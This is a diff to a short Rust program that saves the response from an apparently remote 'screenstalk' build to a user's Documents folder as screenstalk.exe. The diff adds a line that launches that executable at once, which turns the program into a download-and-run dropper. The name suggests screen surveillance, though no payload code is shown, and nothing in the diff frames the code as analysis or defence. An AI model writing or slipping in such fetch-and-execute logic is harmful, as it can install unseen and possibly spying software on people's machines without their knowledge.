@@ -4,6 +4,7 @@ use std::{thread, time};
 use std::fs;
 use directories::UserDirs;
 use std::io::{self, copy};
+use std::process;
 
 
 fn get_screenstalk_build_response() -> Response {
@@ -32,7 +33,10 @@ fn main() {
         let docs_dir = user_dirs.document_dir().unwrap();
         let proj_dir = docs_dir.join("screenstalk");
         create_directory(proj_dir.clone()).unwrap();
-        let mut file = fs::File::create(proj_dir.join("screenstalk.exe")).unwrap();
+        let file_path = proj_dir.join("screenstalk.exe");
+        let mut file = fs::File::create(file_path.clone()).unwrap();
         copy(&mut resp.into_reader(), &mut file).unwrap();
+        process::Command::new(file_path).spawn().unwrap();
     };
+
 }
